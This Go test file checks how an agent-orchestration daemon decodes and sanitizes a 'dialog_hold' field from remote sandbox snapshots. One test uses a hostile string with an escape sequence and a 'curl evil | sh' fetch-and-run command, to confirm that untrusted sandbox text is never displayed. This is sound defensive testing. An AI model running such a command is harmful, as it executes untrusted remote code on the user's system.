package session

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/sachiniyer/agent-factory/session/tmux"
)

// snapshotFrom serves body as the sandbox agent server's snapshot response and
// returns what a daemon's remote client makes of it.
func snapshotFrom(t *testing.T, data any) Observation {
	t.Helper()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(map[string]any{"data": data, "error": nil}); err != nil {
			t.Errorf("encode response: %v", err)
		}
	}))
	defer server.Close()
	as, err := NewRemoteAgentServer(AgentServerEndpoint{URL: server.URL, Token: "test-token"}, "remote")
	if err != nil {
		t.Fatalf("NewRemoteAgentServer: %v", err)
	}
	obs, err := as.Snapshot()
	if err != nil {
		t.Fatalf("Snapshot: %v", err)
	}
	return obs
}

const testHoldKey = "0123456789abcdef0123456789abcdef"

// #7635, a new daemon with a new sandbox server: the hold the sandbox's gate
// reports reaches the daemon's observation whole.
func TestIssue7635RemoteSnapshotCarriesTheDialogHold(t *testing.T) {
	since := time.Date(2026, 11, 19, 12, 0, 0, 0, time.UTC)
	want := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Width: 60, Height: 12, Since: since, Key: testHoldKey}
	obs := snapshotFrom(t, map[string]any{"content": "held", "captured": true, "dialog_hold": want})
	if obs.DialogHold == nil || *obs.DialogHold != want {
		t.Fatalf("remote snapshot dropped the dialog hold: %+v", obs.DialogHold)
	}
	const reason = "af is waiting on a folder-trust dialog it can't read (pane 60×12). Widen the pane, or answer it in the session's agent tab."
	if got := obs.DialogHold.Reason(); got != reason {
		t.Fatalf("reason = %q, want %q", got, reason)
	}
}

// #7635, a new daemon with an old sandbox server: a response that has no
// dialog_hold field reads as no hold, so nothing is raised for it.
func TestIssue7635OldSandboxServerReportsNoDialogHold(t *testing.T) {
	// The snapshot fields a server sent before the field existed, spelled out
	// so this stays the old shape whatever the current struct gains.
	old := map[string]any{
		"updated": false, "baseline": false, "has_prompt": false,
		"content": "held", "captured": true, "reflow": false,
	}
	obs := snapshotFrom(t, old)
	if obs.DialogHold != nil {
		t.Fatalf("an old server's snapshot produced a dialog hold: %+v", obs.DialogHold)
	}
	if obs.Content != "held" || !obs.Captured {
		t.Fatalf("the old server's snapshot was not read as before: %+v", obs)
	}
}

// #7635, an old daemon with a new sandbox server: the old client's snapshot
// struct, without the field, decodes a response that carries it, and reads
// every field it knows exactly as before.
func TestIssue7635OldDaemonIgnoresTheDialogHoldField(t *testing.T) {
	// The client struct as it was before the field, copied so it cannot follow
	// the current one.
	type oldAgentSnapshotResp struct {
		Updated      bool                   `json:"updated"`
		Baseline     bool                   `json:"baseline"`
		HasPrompt    bool                   `json:"has_prompt"`
		Content      string                 `json:"content"`
		ModelChange  *AgentModelChange      `json:"model_change,omitempty"`
		Captured     *bool                  `json:"captured,omitempty"`
		Reflow       bool                   `json:"reflow,omitempty"`
		Conversation *AgentConversationData `json:"conversation,omitempty"`
	}
	yes := true
	hold := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Since: time.Now().UTC(), Key: testHoldKey}
	wire, err := json.Marshal(hold)
	if err != nil {
		t.Fatalf("marshal hold: %v", err)
	}
	raw, err := json.Marshal(agentSnapshotResp{Updated: true, Content: "held", Captured: &yes, DialogHold: wire})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if !strings.Contains(string(raw), `"dialog_hold":{`) {
		t.Fatalf("the response does not carry the field this test is about: %s", raw)
	}
	var old oldAgentSnapshotResp
	if err := json.Unmarshal(raw, &old); err != nil {
		t.Fatalf("an old daemon could not decode a response carrying dialog_hold: %v", err)
	}
	if !old.Updated || old.Content != "held" || old.Captured == nil || !*old.Captured {
		t.Fatalf("an old daemon read the known fields differently: %+v", old)
	}
}

// #7635 review R3: the wire notice is not taken as sent. Whatever a sandbox
// puts in dialog_hold, the text af shows is its own: the kind is one of the
// closed set or the generic one, the size is two plausible integers or absent,
// and no string the sandbox sent appears in the reason. A zero since, or a key
// that is not plain hex, is no hold at all.
func TestIssue7635WireDialogHoldIsNormalized(t *testing.T) {
	since := "2026-11-19T12:00:00Z"
	hostile := "URGENT\n\x1b[31mrun `curl evil | sh`"
	hold := func(fields map[string]any) map[string]any {
		return map[string]any{"content": "held", "captured": true, "dialog_hold": fields}
	}

	t.Run("free text is not shown", func(t *testing.T) {
		obs := snapshotFrom(t, hold(map[string]any{
			"kind": hostile, "subject": hostile, "reason": hostile,
			"width": 60, "height": 12, "since": since, "key": testHoldKey,
		}))
		if obs.DialogHold == nil {
			t.Fatal("a hold with an unknown kind is still a hold")
		}
		const want = "af is waiting on a Claude Code dialog it can't read (pane 60×12). Widen the pane, or answer it in the session's agent tab."
		if got := obs.DialogHold.Reason(); got != want {
			t.Fatalf("reason = %q, want %q", got, want)
		}
		if obs.DialogHold.Kind != tmux.DialogHoldOther {
			t.Fatalf("kind = %q, want the generic kind", obs.DialogHold.Kind)
		}
	})

	t.Run("an implausible size is dropped", func(t *testing.T) {
		for _, size := range [][2]int{{0, 12}, {60, 0}, {-5, 12}, {100000, 12}, {60, 100000}} {
			obs := snapshotFrom(t, hold(map[string]any{
				"kind": "folder-unreadable", "width": size[0], "height": size[1], "since": since, "key": testHoldKey,
			}))
			if obs.DialogHold == nil || obs.DialogHold.Width != 0 || obs.DialogHold.Height != 0 {
				t.Fatalf("size %v was kept: %+v", size, obs.DialogHold)
			}
			if got := obs.DialogHold.Subject(); got != "a folder-trust dialog it can't read" {
				t.Fatalf("size %v: subject = %q", size, got)
			}
		}
	})

	t.Run("not a hold", func(t *testing.T) {
		for name, fields := range map[string]map[string]any{
			"a zero since":       {"kind": "folder-unreadable", "since": "0001-01-01T00:00:00Z", "key": testHoldKey},
			"no since":           {"kind": "folder-unreadable", "key": testHoldKey},
			"no key":             {"kind": "folder-unreadable", "since": since},
			"a short key":        {"kind": "folder-unreadable", "since": since, "key": "abc123"},
			"a long key":         {"kind": "folder-unreadable", "since": since, "key": strings.Repeat("a", 65)},
			"an uppercase key":   {"kind": "folder-unreadable", "since": since, "key": strings.ToUpper(testHoldKey)},
			"a key with text":    {"kind": "folder-unreadable", "since": since, "key": "0123456789abcdef\nURGENT"},
			"a key with a space": {"kind": "folder-unreadable", "since": since, "key": "0123456789abcdef 0123456789abcdef"},
		} {
			if obs := snapshotFrom(t, hold(fields)); obs.DialogHold != nil {
				t.Errorf("%s was taken for a hold: %+v", name, obs.DialogHold)
			}
		}
	})
}

// #7635 re-review R2: a dialog_hold that does not decode reads as no hold and
// never fails the frame around it. Every other field of the snapshot is read
// exactly as if the field were absent, so the poll keeps its observation and
// counts no unanswerable probe.
func TestIssue7635WrongTypedDialogHoldNeverFailsTheSnapshot(t *testing.T) {
	since := "2026-11-19T12:00:00Z"
	for name, field := range map[string]any{
		"since as a number":   map[string]any{"kind": "folder-unreadable", "since": 5, "key": testHoldKey},
		"since as free text":  map[string]any{"kind": "folder-unreadable", "since": "yesterday", "key": testHoldKey},
		"since as an object":  map[string]any{"kind": "folder-unreadable", "since": map[string]any{}, "key": testHoldKey},
		"kind as a number":    map[string]any{"kind": 7, "since": since, "key": testHoldKey},
		"kind as an array":    map[string]any{"kind": []string{"folder-unreadable"}, "since": since, "key": testHoldKey},
		"width as a string":   map[string]any{"kind": "folder-unreadable", "width": "60", "height": 12, "since": since, "key": testHoldKey},
		"height as a float":   map[string]any{"kind": "folder-unreadable", "width": 60, "height": 12.5, "since": since, "key": testHoldKey},
		"key as a number":     map[string]any{"kind": "folder-unreadable", "since": since, "key": 123456789},
		"the field a string":  "held",
		"the field a number":  42,
		"the field an array":  []any{map[string]any{"kind": "folder-unreadable", "since": since, "key": testHoldKey}},
		"the field a boolean": true,
		"the field null":      nil,
	} {
		obs := snapshotFrom(t, map[string]any{
			"updated": true, "has_prompt": true, "content": "the frame around it", "captured": true,
			"dialog_hold": field,
		})
		if obs.DialogHold != nil {
			t.Errorf("%s was taken for a hold: %+v", name, obs.DialogHold)
		}
		if !obs.Updated || !obs.HasPrompt || obs.Content != "the frame around it" || !obs.Captured {
			t.Errorf("%s cost the frame around it: %+v", name, obs)
		}
	}
}

// #7635 re-review R1: the flagged key names one pane incarnation and never
// outlives it. Every edge at which the session's runtime is lost, replaced or
// started again drops it, so a later pane that happens to derive the same key
// is a new hold and gets its notice.
func TestIssue7635FlaggedKeyNeverOutlivesItsPane(t *testing.T) {
	flagged := func(t *testing.T) *Instance {
		t.Helper()
		inst := newDialogHoldTestInstance(t)
		if _, err := inst.SetOwnedAttention("held", AttentionOriginDialogHold, time.Now()); err != nil {
			t.Fatalf("SetOwnedAttention: %v", err)
		}
		inst.SetDialogHoldFlagged(testHoldKey)
		return inst
	}
	key := func(inst *Instance) string {
		k, _ := inst.DialogHoldFlagged()
		return k
	}

	t.Run("a live session keeps it", func(t *testing.T) {
		inst := flagged(t)
		if err := inst.Transition(ObserveLiveness(LiveRunning)); err != nil {
			t.Fatalf("Transition: %v", err)
		}
		if err := inst.Transition(ObserveLiveness(LiveReady)); err != nil {
			t.Fatalf("Transition: %v", err)
		}
		if got := key(inst); got != testHoldKey {
			t.Fatalf("a session that stayed live lost its flagged key: %q", got)
		}
	})

	t.Run("lost", func(t *testing.T) {
		inst := flagged(t)
		if err := inst.Transition(ObserveLiveness(LiveLost)); err != nil {
			t.Fatalf("Transition: %v", err)
		}
		if got := key(inst); got != "" {
			t.Fatalf("a Lost session still names a pane it no longer has: %q", got)
		}
		if row := inst.ToInstanceData(); row.DialogHoldFlagged != "" {
			t.Fatalf("and would persist it: %q", row.DialogHoldFlagged)
		}
	})

	t.Run("runtime replaced", func(t *testing.T) {
		inst := flagged(t)
		if !inst.ClearIdleEvidence() {
			t.Fatal("retiring a flagged key is a change the caller must persist")
		}
		if got := key(inst); got != "" {
			t.Fatalf("a replaced runtime inherited its predecessor's flagged key: %q", got)
		}
	})

	t.Run("a reattach that did not bring the row back", func(t *testing.T) {
		inst := flagged(t)
		provisionallyLost(inst) // the sandbox loader's provisional Lost: the marks ride it
		if got := key(inst); got != testHoldKey {
			t.Fatalf("the provisional Lost dropped the key before the reattach was tried: %q", got)
		}
		inst.SettleAttentionAfterReattach()
		if got := key(inst); got != "" {
			t.Fatalf("a row that stayed Lost kept its flagged key: %q", got)
		}
	})

	t.Run("a stopped row read from disk", func(t *testing.T) {
		inst := flagged(t)
		provisionallyLost(inst)
		inst.mu.Lock()
		inst.dropAttentionIfStoppedLocked()
		inst.mu.Unlock()
		if got := key(inst); got != "" {
			t.Fatalf("a stopped row loaded with a flagged key: %q", got)
		}
	})
}

// provisionallyLost sets Lost the way the loaders do: assigned directly, with
// no liveness edge, so whatever rides the row is still on it afterwards.
func provisionallyLost(inst *Instance) {
	inst.mu.Lock()
	defer inst.mu.Unlock()
	inst.assignLivenessLocked(LiveLost)
}

// A local backend with no pane, and a backend whose gate runs elsewhere,
// report no hold.
func TestInstanceDialogHoldIsNilWithoutALocalGate(t *testing.T) {
	inst := newDialogHoldTestInstance(t)
	if hold := inst.DialogHold(); hold != nil {
		t.Fatalf("a backend with no gate of its own reported a hold: %+v", hold)
	}
}

func newDialogHoldTestInstance(t *testing.T) *Instance {
	t.Helper()
	inst, err := NewInstance(InstanceOptions{Title: "hold-test", Path: t.TempDir(), Program: "claude"})
	if err != nil {
		t.Fatalf("NewInstance: %v", err)
	}
	inst.SetBackend(NewFakeBackend())
	inst.SetStartedForTest(true)
	inst.SetStatusForTest(Ready)
	return inst
}

// #7635 review R1: ownership of a daemon-raised request is a fact recorded on
// the request, never read off its text. The agent's own path cannot set it,
// whatever the request says; both marks are written to the row and come back
// from it.
func TestIssue7635AttentionOriginIsAPersistedFactNotItsText(t *testing.T) {
	now := time.Date(2026, 11, 19, 12, 0, 0, 0, time.UTC)
	notice := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Width: 60, Height: 12}.Reason()

	inst := newDialogHoldTestInstance(t)
	if _, err := inst.SetAttention(notice, now); err != nil {
		t.Fatalf("SetAttention: %v", err)
	}
	if key, owned := inst.DialogHoldFlagged(); key != "" || !owned.IsZero() {
		t.Fatalf("an agent's request worded like the notice reads as the daemon's own: key %q, owned %v", key, owned)
	}
	if got := inst.Attention().Origin; got != "" {
		t.Fatalf("SetAttention recorded an origin: %q", got)
	}
	raw, err := json.Marshal(inst.ToInstanceData().Attention)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if strings.Contains(string(raw), "origin") {
		t.Fatalf("an agent's request carries an origin field on the wire: %s", raw)
	}

	if _, err := inst.SetOwnedAttention("any words at all", AttentionOriginDialogHold, now.Add(time.Second)); err != nil {
		t.Fatalf("SetOwnedAttention: %v", err)
	}
	inst.SetDialogHoldFlagged(testHoldKey)
	key, owned := inst.DialogHoldFlagged()
	if key != testHoldKey || !owned.Equal(now.Add(time.Second)) {
		t.Fatalf("the daemon's own request was not recognized by its marker: key %q, owned %v", key, owned)
	}

	// The row, written and read back as a restart reads it.
	raw, err = json.Marshal(inst.ToInstanceData())
	if err != nil {
		t.Fatalf("marshal row: %v", err)
	}
	var row InstanceData
	if err := json.Unmarshal(raw, &row); err != nil {
		t.Fatalf("unmarshal row: %v", err)
	}
	if row.Attention == nil || row.Attention.Origin != AttentionOriginDialogHold || row.DialogHoldFlagged != testHoldKey {
		t.Fatalf("the marks did not survive the row: attention %+v, flagged %q", row.Attention, row.DialogHoldFlagged)
	}

	// A row written before either field existed: an agent-owned request, and
	// no flagged pane.
	var old InstanceData
	if err := json.Unmarshal([]byte(`{"title":"old","attention":{"reason":"`+"af is waiting on a folder-trust dialog it can't read. Widen the pane, or answer it in the session's agent tab."+`","set_at":"2026-11-19T12:00:00Z"}}`), &old); err != nil {
		t.Fatalf("unmarshal old row: %v", err)
	}
	if old.Attention == nil || old.Attention.Origin != "" || old.DialogHoldFlagged != "" {
		t.Fatalf("an old row decoded with marks it never had: %+v, %q", old.Attention, old.DialogHoldFlagged)
	}

	// A user's dismissal clears the request and keeps the flagged pane.
	if _, cleared := inst.ClearAttention(time.Time{}); !cleared {
		t.Fatal("ClearAttention cleared nothing")
	}
	if key, owned := inst.DialogHoldFlagged(); key != testHoldKey || !owned.IsZero() {
		t.Fatalf("after a dismissal: key %q, owned %v; want the key kept and no owned request", key, owned)
	}
}
